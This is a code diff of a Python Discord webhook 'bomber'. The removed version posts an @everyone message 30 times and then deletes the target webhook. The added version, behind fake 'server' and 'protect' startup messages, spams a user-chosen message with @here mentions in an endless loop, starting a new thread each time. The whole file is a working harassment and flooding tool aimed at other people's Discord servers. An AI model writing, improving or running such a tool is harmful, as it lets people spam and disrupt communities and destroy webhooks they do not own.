@@ -1,17 +1,10 @@
-import time
-
-import requests
-import json
-import threading
 import os
+import random
+import threading
+from time import sleep
+import requests
 import colorama
-from colorama import *
-from threading import *
-import pystyle
-from pystyle import *
-import rich
-from rich import *
-while True:
+
 
 
     banner = """
@@ -19,7 +12,7 @@ while True:
  __   __ _____            ____                  _               
  \ \ / // ____|          |  _ \                | |              
   \ V /| (___    ______  | |_) | ___  _ __ ___ | |__   ___ _ __ 
-   > <  \___ \  |______| |  _ < / _ \| '_ ` _ \| '_ \ / _ | '__|
+   > <  \___ \  |______| |  _ < / _ \| '_ ` _ \| '_ \ / _ |  __|
   / . \ ____) |          | |_) | (_) | | | | | | |_) |  __| |   
  /_/ \_|_____/           |____/ \___/|_| |_| |_|_.__/ \___|_|  
                                                                                    
@@ -27,30 +20,39 @@ while True:
     
     
     """
-    console = get_console()
-    print(Fore.BLUE + banner)
-    def nuker():
-        os.system(f'Title - XSBomber v1.0 - hit: {hit}')
-        res = requests.post(webhooks1,  json={'username': 'XSBOMBER', 'content': '@everyone https://tenor.com/view/hacker-pc-meme-matrix-codes-gif-16730883 https://tenor.com/view/hack-pc-guy-fawkes-hacker-gif-17047231 https://tenor.com/view/hacker-typing-hacking-computer-codes-gif-17417874'})
-        console.print("{[blue]![/blue]} Message sent to the webhook")
-    threads = []
-    webhooks1 = console.input("{[blue]?[/blue]} Enter the webhook to nuke : ")
-    print()
-    print()
-    hit = 0
-    for i in range(30):
-        hit = hit + 1
-        t = threading.Thread(target=nuker())
-        threads.append(t)
-        t.start()
+sleep(5)
+print(f"""
+Starting Server..
+v1.0
+""")
+sleep (5)
+print(f"""
+Executing XS PROTECT Script..
+v1.0
+""")
+print(""" 
+Starting Spam Bomber Menu
+v1.0
+""")
+sleep(3)
+os.system("cls")
+# load up the main
+LINK = input("Enter the discord webhook url: ")
+sleep(2)
+os.system("cls")
+MSG = input("Enter the message you want to spam with mention everyone: ")
+print("Starting to spam...")
+sleep(2)
+os.system("cls")
+def send_message(link, msg):
+    print(f"Sending message ...")
+    try:
+        requests.post(link, data={"content": f"@here\n{msg}", "username": random.randint(123, 12318248124)})
+        print("Message sent!")
+    except:
+        pass
+while True:
+    t = threading.Thread(target=send_message, args=(LINK, MSG))
+    t.start()
 
 
-    r = requests.delete(webhooks1)
-    hit = 0
-
-    print()
-    print()
-    console = console()
-    console.print("{[red]![/red]} XSBOMBER v1.0")
-    console.input("{[red]![/red]} Press enter to continue ")
-    os.system('CLS || clear')
